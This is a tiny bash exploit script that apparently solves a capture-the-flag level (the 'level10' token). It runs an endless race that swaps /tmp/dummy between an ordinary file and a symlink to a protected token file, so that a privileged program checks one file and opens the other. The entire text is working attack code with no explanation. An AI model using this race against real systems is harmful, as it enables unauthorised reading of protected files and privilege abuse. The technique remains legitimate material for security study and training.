#!/bin/bash
while true; do
    touch /tmp/dummy
    rm -f /tmp/dummy
    ln -s /home/user/level10/token /tmp/dummy
    rm -f /tmp/dummy
done